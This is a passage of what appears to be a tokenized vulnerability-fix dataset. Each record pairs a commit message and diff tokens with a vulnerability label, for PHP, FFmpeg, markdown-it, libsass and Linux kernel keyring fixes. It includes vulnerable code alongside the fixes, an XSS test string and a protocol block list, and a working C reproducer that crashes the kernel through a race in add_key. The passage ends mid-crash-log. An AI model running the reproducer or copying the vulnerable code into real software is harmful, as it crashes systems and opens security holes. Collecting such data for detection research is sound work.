"xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_WRITE_NETWORK", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_WRITE_NETWORK", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "0", "!", "=", "xsltSetCtxtSecurityPrefs", "(", "secPrefs", ",", "ctxt", ")", ")", "{", "if", "(", "0", "!", "=", "xsltSetCtxtSecurityPrefs", "(", "secPrefs", ",", "ctxt", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "secPrefsError", "=", "=", "1", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", ",", "not", "doing", "transformation", "for", "security", "reasons", "\"", ");", "}", "else", "{", "@", "@", "-", "609", ",", "15", "+", "613", ",", "15", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "if", "(", "f", ")", "{", "fclose", "(", "f", ")", ";", "}", "xsltFreeTransformContext", "(", "ctxt", ")", ";", "if", "(", "secPrefs", ")", "{", "xsltFreeSecurityPrefs", "(", "secPrefs", ")", ";", "}", "if", "(", "intern", "-", ">", "node_list", "!", "=", "NULL", ")", "{", "zend_hash_destroy", "(", "intern", "-", ">", "node_list", ")", ";", "FREE_HASHTABLE", "(", "intern", "-", ">", "node_list", ")", ";", "FREE_HASHTABLE", "(", "intern", "-", ">", "node_list", ")", ";", "intern", "-", ">", "node_list", "=", "NULL", ";", "}", "@", "@", "-", "640", ",", "7", "+", "644", ",", "7", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "/", "*", "{", "{{", "proto", "domdocument", "xsl_xsltprocessor_transform_to_doc", "(", "domnode", "doc", ")", ";", "URL", ":", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "TR", "/", "2003", "/", "WD", "-", "DOM", "-", "Level", "-", "3", "-", "Core", "-", "20030226", "/", "DOM3", "-", "Core", ".", "html", "#", "Since", ":", "Since", ":", "*", "/", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_doc", ")", "{", "@", "@", "-", "677", ",", "13", "+", "681", ",", "13", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_doc", ")", "found", "=", "zend_lookup_class", "(", "ret_class", ",", "ret_class_len", ",", "&", "ce", "TSRMLS_CC", ")", ";", "if", "(", "(", "found", "!", "=", "SUCCESS", ")", "|", "|", "!", "instanceof_function", "(", "*", "ce", ",", "curce", "TSRMLS_CC", ")", ")", "{", "xmlFreeDoc", "(", "newdocp", ")", ";", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Expecting", "class", "compatible", "with", "%", "s", ",", "'", "%", "s", "'", "given", "\"", ",", "curclass_name", ",", "ret_class", ")", ";", "RETURN_FALSE", ";", "}", "object_init_ex", "(", "return_value", ",", "*", "ce", ")", ";", "interndoc", "=", "(", "php_libxml_node_object", "*", ")", "zend_objects_get_address", "(", "return_value", "TSRMLS_CC", ")", ";", "php_libxml_increment_doc_ref", "(", "interndoc", ",", "newdocp", "TSRMLS_CC", ")", ";", "php_libxml_increment_node_ptr", "(", "interndoc", ",", "(", "xmlNodePtr", ")", "newdocp", ",", "(", "void", "*", ")", "interndoc", "TSRMLS_CC", ")", ";", "@", "@", "-", "693", ",", "7", "+", "697", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_doc", ")", "}", "else", "{", "RETURN_FALSE", ";", "}", "}", "/", "*", "}", "}}", "end", "xsl_xsltprocessor_transform_to_doc", "*", "/", "@", "@", "-", "707", ",", "7", "+", "711", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_uri", ")", "int", "ret", ",", "uri_len", ";", "char", "*", "uri", ";", "xsl_object", "*", "intern", ";", "id", "=", "getThis", "(", ");", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "sheetp", "=", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ";", "@", "@", "-", "739", ",", "7", "+", "743", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_xml", ")", "xmlChar", "*", "doc_txt_ptr", ";", "int", "doc_txt_len", ";", "xsl_object", "*", "intern", ";", "id", "=", "getThis", "(", ");", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "sheetp", "=", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ";", "@", "@", "-", "770", ",", "7", "+", "774", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_transform_to_xml", ")", "*", "/", "PHP_FUNCTION", "(", "xsl_xsltprocessor_set_parameter", ")", "{", "zval", "*", "id", ";", "zval", "*", "array_value", ",", "*", "*", "entry", ",", "*", "new_string", ";", "xsl_object", "*", "intern", ";", "@", "@", "-", "786", ",", "34", "+", "790", ",", "34", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_set_parameter", ")", "while", "(", "zend_hash_get_current_data", "(", "Z_ARRVAL_P", "(", "array_value", ")", ",", "(", "void", "*", "*)", "&", "entry", ")", "=", "=", "SUCCESS", ")", "{", "SEPARATE_ZVAL", "(", "entry", ")", ";", "convert_to_string_ex", "(", "entry", ")", ";", "if", "(", "zend_hash_get_current_key_ex", "(", "Z_ARRVAL_P", "(", "array_value", ")", ",", "&", "string_key", ",", "&", "string_key_len", ",", "&", "idx", ",", "0", ",", "NULL", ")", "!", "=", "HASH_KEY_IS_STRING", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Invalid", "parameter", "array", "\"", ");", "RETURN_FALSE", ";", "}", "ALLOC_ZVAL", "(", "new_string", ")", ";", "Z_ADDREF_PP", "(", "entry", ")", ";", "COPY_PZVAL_TO_ZVAL", "(", "*", "new_string", ",", "*", "entry", ")", ";", "zend_hash_update", "(", "intern", "-", ">", "parameter", ",", "string_key", ",", "string_key_len", ",", "&", "new_string", ",", "sizeof", "(", "zval", "*", "),", "NULL", ")", ";", "zend_hash_move_forward", "(", "Z_ARRVAL_P", "(", "array_value", ")", ");", "}", "RETURN_TRUE", ";", "}", "else", "if", "(", "zend_parse_parameters_ex", "(", "ZEND_PARSE_PARAMS_QUIET", ",", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "sss", "\"", ",", "&", "namespace", ",", "&", "namespace_len", ",", "&", "name", ",", "&", "name_len", ",", "&", "value", ",", "&", "value_len", ")", "=", "=", "SUCCESS", ")", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "MAKE_STD_ZVAL", "(", "new_string", ")", ";", "ZVAL_STRING", "(", "new_string", ",", "value", ",", "1", ")", ";", "zend_hash_update", "(", "intern", "-", ">", "parameter", ",", "name", ",", "name_len", "+", "1", ",", "&", "new_string", ",", "sizeof", "(", "zval", "*", "),", "NULL", ")", ";", "RETURN_TRUE", ";", "}", "else", "{", "WRONG_PARAM_COUNT", ";", "}", "}", "/", "*", "}", "}}", "end", "xsl_xsltprocessor_set_parameter", "*", "/", "@", "@", "-", "828", ",", "7", "+", "832", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_get_parameter", ")", "xsl_object", "*", "intern", ";", "DOM_GET_THIS", "(", "id", ")", ";", "if", "(", "zend_parse_parameters", "(", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "ss", "\"", ",", "&", "namespace", ",", "&", "namespace_len", ",", "&", "name", ",", "&", "name_len", ")", "=", "=", "FAILURE", ")", "{", "RETURN_FALSE", ";", "}", "@", "@", "-", "852", ",", "7", "+", "856", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_remove_parameter", ")", "xsl_object", "*", "intern", ";", "DOM_GET_THIS", "(", "id", ")", ";", "if", "(", "zend_parse_parameters", "(", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "ss", "\"", ",", "&", "namespace", ",", "&", "namespace_len", ",", "&", "name", ",", "&", "name_len", ")", "=", "=", "FAILURE", ")", "{", "RETURN_FALSE", ";", "}", "@", "@", "-", "876", ",", "36", "+", "880", ",", "36", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_register_php_functions", ")", "char", "*", "name", ";", "DOM_GET_THIS", "(", "id", ")", ";", "if", "(", "zend_parse_parameters_ex", "(", "ZEND_PARSE_PARAMS_QUIET", ",", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "a", "\"", ",", "&", "array_value", ")", "=", "=", "SUCCESS", ")", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "zend_hash_internal_pointer_reset", "(", "Z_ARRVAL_P", "(", "array_value", ")", ");", "while", "(", "zend_hash_get_current_data", "(", "Z_ARRVAL_P", "(", "array_value", ")", ",", "(", "void", "*", "*)", "&", "entry", ")", "=", "=", "SUCCESS", ")", "{", "SEPARATE_ZVAL", "(", "entry", ")", ";", "convert_to_string_ex", "(", "entry", ")", ";", "MAKE_STD_ZVAL", "(", "new_string", ")", ";", "ZVAL_LONG", "(", "new_string", ",", "1", ")", ";", "zend_hash_update", "(", "intern", "-", ">", "registered_phpfunctions", ",", "Z_STRVAL_PP", "(", "entry", ")", ",", "Z_STRLEN_PP", "(", "entry", ")", "+", "1", ",", "&", "new_string", ",", "sizeof", "(", "zval", "*", "),", "NULL", ")", ";", "zend_hash_move_forward", "(", "Z_ARRVAL_P", "(", "array_value", ")", ");", "}", "intern", "-", ">", "registerPhpFunctions", "=", "2", ";", "}", "else", "if", "(", "zend_parse_parameters_ex", "(", "ZEND_PARSE_PARAMS_QUIET", ",", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "s", "\"", ",", "&", "name", ",", "&", "name_len", ")", "=", "=", "SUCCESS", ")", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "MAKE_STD_ZVAL", "(", "new_string", ")", ";", "ZVAL_LONG", "(", "new_string", ",", "1", ")", ";", "zend_hash_update", "(", "intern", "-", ">", "registered_phpfunctions", ",", "name", ",", "name_len", "+", "1", ",", "&", "new_string", ",", "sizeof", "(", "zval", "*", "),", "NULL", ")", ";", "intern", "-", ">", "registerPhpFunctions", "=", "2", ";", "}", "else", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "intern", "-", ">", "registerPhpFunctions", "=", "1", ";", "}", "}", "/", "*", "}", "}}", "end", "xsl_xsltprocessor_register_php_functions", "(", ");", "*", "/", "@", "@", "-", "947", ",", "7", "+", "951", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_set_security_prefs", ")", "return", ";", "}", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "oldSecurityPrefs", "=", "intern", "-", ">", "securityPrefs", ";", "oldSecurityPrefs", "=", "intern", "-", ">", "securityPrefs", ";", "intern", "-", ">", "securityPrefs", "=", "securityPrefs", ";", "/", "*", "set", "this", "to", "1", "so", "that", "we", "know", ",", "it", "was", "set", "through", "this", "method", ".", "Can", "be", "removed", ",", "when", "we", "remove", "the", "ini", "setting", "*", "/", "intern", "-", ">", "securityPrefsSet", "=", "1", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Outlaw", "data:", "URLs", "by", "default", "See", "#227.", "It", "would", "still", "be", "better", "to", "switch", "to", "a", "whitelist", "but", "this", "is", "an", "improvement."], "code_tokens": ["@", "@", "-", "144", ",", "7", "+", "144", ",", "7", "@", "@", "ParserInline", ".", "prototype", ".", "parse", "=", "function", "(", "str", ",", "options", ",", "env", ",", "outTokens", ")", "{", "*", "/", "function", "validateLink", "(", "url", ")", "{", "var", "BAD_PROTOCOLS", "=", "[", "'", "vbscript", "'", ",", "'", "javascript", "'", ",", "'", "file", "'", "]", ";", "var", "BAD_PROTOCOLS", "=", "[", "'", "vbscript", "'", ",", "'", "javascript", "'", ",", "'", "file", "'", ",", "'", "data", "'", "]", ";", "var", "str", "=", "url", ".", "trim", "(", ").", "toLowerCase", "(", ");", "/", "/", "Care", "about", "digital", "entities", "\"", "javascript", "&", "#", "x3A", ";", "alert", "(", "1", ")", "\"", "str", "=", "utils", ".", "replaceEntities", "(", "str", ")", ";"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["avcodec/vc1_block:", "Fix", "mqaunt", "check", "for", "negative", "values", "Fixes:", "out", "of", "array", "access", "Fixes:", "ffmpeg_bof_4.avi", "Fixes:", "ffmpeg_bof_5.avi", "Fixes:", "ffmpeg_bof_6.avi", "Found-by:", "Thuan", "Pham,", "Marcel", "B\u00f6hme,", "Andrew", "Santosa", "and", "Alexandru", "Razvan", "Caciulescu", "with", "AFLSmart", "Reviewed-by:", "Jerome", "Borsboom", "<jerome.borsboom@carpalis.nl>", "Signed-off-by:", "Michael", "Niedermayer", "<michael@niedermayer.cc>"], "code_tokens": ["@", "@", "-", "207", ",", "7", "+", "207", ",", "7", "@", "@", "static", "void", "vc1_put_blocks_clamped", "(", "VC1Context", "*", "v", ",", "int", "put_signed", ")", "if", "(", "(", "edges", "&", "8", ")", "&", "&", "\\", "s", "-", ">", "mb_y", "=", "=", "(", "(", "s", "-", ">", "mb_height", ">", ">", "v", "-", ">", "field_mode", ")", "-", "1", ")", ")", "\\", "mquant", "=", "-", "v", "-", ">", "altpq", ";", "\\", "if", "(", "!", "mquant", "|", "|", "mquant", ">", "31", ")", "{", "\\", "if", "(", "!", "mquant", "|", "|", "mquant", ">", "31", "|", "|", "mquant", "<", "-", "31", ")", "{", "\\", "av_log", "(", "v", "-", ">", "s", ".", "avctx", ",", "AV_LOG_ERROR", ",", "\\", "\"", "Overriding", "invalid", "mquant", "%", "d", "\\", "n", "\"", ",", "mquant", ")", ";", "\\", "mquant", "=", "1", ";", "\\"], "docstring_tokens": ["information", "disclosure"]}
{"contents": ["mov:", "Fix", "negative", "size", "calculation", "in", "mov_read_default().", "The", "previous", "code", "assumed", "if", "an", "atom", "was", "marked", "with", "a", "64-bit", "size", "extension,", "it", "actually", "had", "that", "data", "available.", "The", "new", "code", "verfies", "there's", "enough", "data", "in", "the", "atom", "for", "this", "to", "be", "done.", "Failure", "to", "verify", "causes", "total_size", ">", "atom.size", "which", "will", "result", "in", "negative", "size", "calculations", "later", "on.", "Found-by:", "Paul", "Mehta", "<paul@paulmehta.com>", "Signed-off-by:", "Dale", "Curtis", "<dalecurtis@chromium.org>", "Signed-off-by:", "Michael", "Niedermayer", "<michaelni@gmx.at>", "(cherry", "picked", "from", "commit", "3ebd76a9c57558e284e94da367dd23b435e6a6d0)", "Signed-off-by:", "Michael", "Niedermayer", "<michaelni@gmx.at>"], "code_tokens": ["@", "@", "-", "3231", ",", "7", "+", "3231", ",", "7", "@", "@", "static", "int", "mov_read_default", "(", "MOVContext", "*", "c", ",", "AVIOContext", "*", "pb", ",", "MOVAtom", "atom", ")", "}", "}", "total_size", "+", "=", "8", ";", "if", "(", "a", ".", "size", "=", "=", "1", ")", "{", "/", "*", "64", "bit", "extended", "size", "*", "/", "if", "(", "a", ".", "size", "=", "=", "1", "&", "&", "total_size", "+", "8", "<", "=", "atom", ".", "size", ")", "{", "/", "*", "64", "bit", "extended", "size", "*", "/", "a", ".", "size", "=", "avio_rb64", "(", "pb", ")", "-", "8", ";", "total_size", "+", "=", "8", ";", "}"], "docstring_tokens": ["integer", "underflow"]}
{"contents": ["Fixed", "Bug", "#69667", "segfault", "in", "php_pgsql_meta_data", "Incomplete", "fix", "for", "#68741"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "27", "@", "@", "-", "-", "TEST", "-", "-", "PostgreSQL", "pg_select", "(", ")", "-", "basic", "test", "using", "schema", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "include", "(", "\"", "skipif", ".", "inc", "\"", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "include", "(", "'", "config", ".", "inc", "'", ");", "$", "conn", "=", "pg_connect", "(", "$", "conn_str", ")", ";", "foreach", "(", "array", "(", "''", ",", "'", ".'", ",", "'", "..", "')", "as", "$", "table", ")", "{", "var_dump", "(", "pg_insert", "(", "$", "conn", ",", "'", "',", "array", "(", "'", "id", "'", "=", ">", "1", ",", "'", "id2", "'", "=", ">", "1", ")", "))", ";", "}", "?", ">", "Done", "-", "-", "EXPECTF", "-", "-", "Warning", ":", "pg_insert", "(", "):", "The", "table", "name", "must", "be", "specified", "in", "%", "s", "on", "line", "%", "d", "bool", "(", "false", ")", "Warning", ":", "pg_insert", "(", "):", "The", "table", "name", "must", "be", "specified", "in", "%", "s", "on", "line", "%", "d", "bool", "(", "false", ")", "Warning", ":", "pg_insert", "(", "):", "The", "table", "name", "must", "be", "specified", "in", "%", "s", "on", "line", "%", "d", "bool", "(", "false", ")", "Done", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "5120", ",", "7", "+", "5120", ",", "11", "@", "@", "PHP_PGSQL_API", "int", "php_pgsql_meta_data", "(", "PGconn", "*", "pg_link", ",", "const", "char", "*", "table_name", ",", "z", "src", "=", "estrdup", "(", "table_name", ")", ";", "tmp_name", "=", "php_strtok_r", "(", "src", ",", "\"", ".\"", ",", "&", "tmp_name2", ")", ";", "if", "(", "!", "tmp_name", ")", "{", "efree", "(", "src", ")", ";", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "The", "table", "name", "must", "be", "specified", "\"", ");", "return", "FAILURE", ";", "}", "if", "(", "!", "tmp_name2", "|", "|", "!", "*", "tmp_name2", ")", "{", "/", "*", "Default", "schema", "*", "/", "tmp_name2", "=", "tmp_name", ";", "@", "@", "-", "6130", ",", "7", "+", "6134", ",", "8", "@", "@", "static", "int", "do_exec", "(", "smart_str", "*", "querystr", ",", "int", "expect", ",", "PGconn", "*", "pg_link", ",", "ulong", "opt", "T", "static", "inline", "void", "build_tablename", "(", "smart_str", "*", "querystr", ",", "PGconn", "*", "pg_link", ",", "const", "char", "*", "table", ")", "{", "char", "*", "table_copy", ",", "*", "escaped", ",", "*", "token", ",", "*", "tmp", ";", "char", "*", "table_copy", ",", "*", "escaped", ",", "*", "tmp", ";", "const", "char", "*", "token", ";", "size_t", "len", ";", "/", "*", "schame", ".", "table", "should", "be", "\"", "schame", "\"", ".\"", "table", "\"", "*", "/"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Error", "on", "incomplete", "`@supports`", "clause", "in", "parser", "(#2860)", "Fixes", "#2786", "Spec", "added", "in", "https://github.com/sass/sass-spec/pull/1370"], "code_tokens": ["@", "@", "-", "2415", ",", "10", "+", "2415", ",", "7", "@", "@", "namespace", "Sass", "{", "/", "/", "these", "are", "very", "similar", "to", "media", "blocks", "Supports_Block_Obj", "Parser", ":", ":", "parse_supports_directive", "(", ")", "{", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition", "(", ");", "if", "(", "!", "cond", ")", "{", "css_error", "(", "\"", "Invalid", "CSS", "\"", ",", "\"", "after", "\"", ",", "\"", ":", "expected", "@", "supports", "condition", "(", "e", ".", "g", ".", "(", "display", ":", "flexbox", ")", "),", "was", "\"", ",", "false", ")", ";", "}", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition", "(", "/*", "top_level", "=", "*/", "true", ")", ";", "/", "/", "create", "the", "ast", "node", "object", "for", "the", "support", "queries", "Supports_Block_Obj", "query", "=", "SASS_MEMORY_NEW", "(", "Supports_Block", ",", "pstate", ",", "cond", ")", ";", "/", "/", "additional", "block", "is", "mandatory", "@", "@", "-", "2430", ",", "26", "+", "2427", ",", "26", "@", "@", "namespace", "Sass", "{", "/", "/", "parse", "one", "query", "operation", "/", "/", "may", "encounter", "nested", "queries", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_condition", "(", ")", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_condition", "(", "bool", "top_level", ")", "{", "lex", "<", "css_whitespace", ">", "()", ";", "Supports_Condition_Obj", "cond", ";", "if", "(", "(", "cond", "=", "parse_supports_negation", "(", "))", ")", "return", "cond", ";", "if", "(", "(", "cond", "=", "parse_supports_operator", "(", "))", ")", "return", "cond", ";", "if", "(", "(", "cond", "=", "parse_supports_operator", "(", "top_level", ")", "))", "return", "cond", ";", "if", "(", "(", "cond", "=", "parse_supports_interpolation", "(", "))", ")", "return", "cond", ";", "return", "cond", ";", "}", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_negation", "(", ")", "{", "if", "(", "!", "lex", "<", "kwd_not", ">", "()", ")", "return", "{", "};", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition_in_parens", "(", ");", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition_in_parens", "(", "/*", "parens_required", "=", "*/", "true", ")", ";", "return", "SASS_MEMORY_NEW", "(", "Supports_Negation", ",", "pstate", ",", "cond", ")", ";", "}", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_operator", "(", ")", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_operator", "(", "bool", "top_level", ")", "{", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition_in_parens", "(", ");", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition_in_parens", "(", "/*", "parens_required", "=", "*/", "top_level", ")", ";", "if", "(", "cond", ".", "isNull", "(", "))", "return", "{", "};", "while", "(", "true", ")", "{", "@", "@", "-", "2458", ",", "7", "+", "2455", ",", "7", "@", "@", "namespace", "Sass", "{", "else", "if", "(", "!", "lex", "<", "kwd_or", ">", "()", ")", "{", "break", ";", "}", "lex", "<", "css_whitespace", ">", "()", ";", "Supports_Condition_Obj", "right", "=", "parse_supports_condition_in_parens", "(", ");", "Supports_Condition_Obj", "right", "=", "parse_supports_condition_in_parens", "(", "/*", "parens_required", "=", "*/", "true", ")", ";", "/", "/", "Supports_Condition", "*", "cc", "=", "SASS_MEMORY_NEW", "(", "Supports_Condition", ",", "*", "static_cast", "<", "Supports_Condition", "*", ">(", "cond", ")", ");", "cond", "=", "SASS_MEMORY_NEW", "(", "Supports_Operator", ",", "pstate", ",", "cond", ",", "right", ",", "op", ")", ";", "@", "@", "-", "2496", ",", "21", "+", "2493", ",", "24", "@", "@", "namespace", "Sass", "{", "return", "cond", ";", "}", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_condition_in_parens", "(", ")", "Supports_Condition_Obj", "Parser", ":", ":", "parse_supports_condition_in_parens", "(", "bool", "parens_required", ")", "{", "Supports_Condition_Obj", "interp", "=", "parse_supports_interpolation", "(", ");", "if", "(", "interp", "!", "=", "0", ")", "return", "interp", ";", "if", "(", "!", "lex", "<", "exactly", "<", "'(", "'>", ">", "()", ")", "return", "{", "};", "if", "(", "!", "lex", "<", "exactly", "<", "'(", "'>", ">", "()", ")", "{", "if", "(", "parens_required", ")", "{", "css_error", "(", "\"", "Invalid", "CSS", "\"", ",", "\"", "after", "\"", ",", "\"", ":", "expected", "@", "supports", "condition", "(", "e", ".", "g", ".", "(", "display", ":", "flexbox", ")", "),", "was", "\"", ",", "/", "*", "trim", "=", "*/", "false", ")", ";", "}", "else", "{", "return", "{", "};", "}", "}", "lex", "<", "css_whitespace", ">", "()", ";", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition", "(", ");", "if", "(", "cond", "!", "=", "0", ")", "{", "if", "(", "!", "lex", "<", "exactly", "<", "')", "'>", ">", "()", ")", "error", "(", "\"", "unclosed", "parenthesis", "in", "@", "supports", "declaration", "\"", ");", "}", "else", "{", "cond", "=", "parse_supports_declaration", "(", ");", "if", "(", "!", "lex", "<", "exactly", "<", "')", "'>", ">", "()", ")", "error", "(", "\"", "unclosed", "parenthesis", "in", "@", "supports", "declaration", "\"", ");", "}", "Supports_Condition_Obj", "cond", "=", "parse_supports_condition", "(", "/*", "top_level", "=", "*/", "false", ")", ";", "if", "(", "cond", ".", "isNull", "(", "))", "cond", "=", "parse_supports_declaration", "(", ");", "if", "(", "!", "lex", "<", "exactly", "<", "')", "'>", ">", "()", ")", "error", "(", "\"", "unclosed", "parenthesis", "in", "@", "supports", "declaration", "\"", ");", "lex", "<", "css_whitespace", ">", "()", ";", "return", "cond", ";", "}", "@", "@", "-", "312", ",", "12", "+", "312", ",", "12", "@", "@", "namespace", "Sass", "{", "Media_Query_Obj", "parse_media_query", "(", ");", "Media_Query_Expression_Obj", "parse_media_expression", "(", ");", "Supports_Block_Obj", "parse_supports_directive", "(", ");", "Supports_Condition_Obj", "parse_supports_condition", "(", ");", "Supports_Condition_Obj", "parse_supports_condition", "(", "bool", "top_level", ")", ";", "Supports_Condition_Obj", "parse_supports_negation", "(", ");", "Supports_Condition_Obj", "parse_supports_operator", "(", ");", "Supports_Condition_Obj", "parse_supports_operator", "(", "bool", "top_level", ")", ";", "Supports_Condition_Obj", "parse_supports_interpolation", "(", ");", "Supports_Condition_Obj", "parse_supports_declaration", "(", ");", "Supports_Condition_Obj", "parse_supports_condition_in_parens", "(", ");", "Supports_Condition_Obj", "parse_supports_condition_in_parens", "(", "bool", "parens_required", ")", ";", "At_Root_Block_Obj", "parse_at_root_block", "(", ");", "At_Root_Query_Obj", "parse_at_root_query", "(", ");", "String_Schema_Obj", "parse_almost_any_value", "(", ");"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["KEYS:", "don't", "let", "add_key()", "update", "an", "uninstantiated", "key", "Currently,", "when", "passed", "a", "key", "that", "already", "exists,", "add_key()", "will", "call", "the", "key's", "->update()", "method", "if", "such", "exists.", "But", "this", "is", "heavily", "broken", "in", "the", "case", "where", "the", "key", "is", "uninstantiated", "because", "it", "doesn't", "call", "__key_instantiate_and_link().", "Consequently,", "it", "doesn't", "do", "most", "of", "the", "things", "that", "are", "supposed", "to", "happen", "when", "the", "key", "is", "instantiated,", "such", "as", "setting", "the", "instantiation", "state,", "clearing", "KEY_FLAG_USER_CONSTRUCT", "and", "awakening", "tasks", "waiting", "on", "it,", "and", "incrementing", "key->user->nikeys.", "It", "also", "never", "takes", "key_construction_mutex,", "which", "means", "that", "->instantiate()", "can", "run", "concurrently", "with", "->update()", "on", "the", "same", "key.", "In", "the", "case", "of", "the", "\"user\"", "and", "\"logon\"", "key", "types", "this", "causes", "a", "memory", "leak,", "at", "best.", "Maybe", "even", "worse,", "the", "->update()", "methods", "of", "the", "\"encrypted\"", "and", "\"trusted\"", "key", "types", "actually", "just", "dereference", "a", "NULL", "pointer", "when", "passed", "an", "uninstantiated", "key.", "Change", "key_create_or_update()", "to", "wait", "interruptibly", "for", "the", "key", "to", "finish", "construction", "before", "continuing.", "This", "patch", "only", "affects", "*uninstantiated*", "keys.", "For", "now", "we", "still", "allow", "a", "negatively", "instantiated", "key", "to", "be", "updated", "(thereby", "positively", "instantiating", "it),", "although", "that's", "broken", "too", "(the", "next", "patch", "fixes", "it)", "and", "I'm", "not", "sure", "that", "anyone", "actually", "uses", "that", "functionality", "either.", "Here", "is", "a", "simple", "reproducer", "for", "the", "bug", "using", "the", "\"encrypted\"", "key", "type", "(requires", "CONFIG_ENCRYPTED_KEYS=y),", "though", "as", "noted", "above", "the", "bug", "pertained", "to", "more", "than", "just", "the", "\"encrypted\"", "key", "type:", "#include", "<stdlib.h>", "#include", "<unistd.h>", "#include", "<keyutils.h>", "int", "main(void)", "{", "int", "ringid", "=", "keyctl_join_session_keyring(NULL);", "if", "(fork())", "{", "for", "(;;)", "{", "const", "char", "payload[]", "=", "\"update", "user:foo", "32\";", "usleep(rand()", "%", "10000);", "add_key(\"encrypted\",", "\"desc\",", "payload,", "sizeof(payload),", "ringid);", "keyctl_clear(ringid);", "}", "}", "else", "{", "for", "(;;)", "request_key(\"encrypted\",", "\"desc\",", "\"callout_info\",", "ringid);", "}", "}", "It", "causes:", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "0000000000000018", "IP:", "encrypted_update+0xb0/0x170", "PGD", "7a178067", "P4D", "7a178067", "PUD", "77269067", "PMD", "0", "PREEMPT", "SMP", "CPU:", "0", "PID:", "340", "Comm:", "reproduce", "Tainted:", "G", "D", "4.14.0-rc1-00025-g428490e38b2e", "#796", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Bochs", "01/01/2011", "task:", "ffff8a467a39a340", "task.stack:", "ffffb15c40770000", "RIP:", "0010:encrypted_update+0xb0/0x170", "RSP:", "0018:ffffb15c40773de8", "EFLAGS:", "00010246", "RAX:", "0000000000000000", "RBX:", "ffff8a467a275b00", "RCX:", 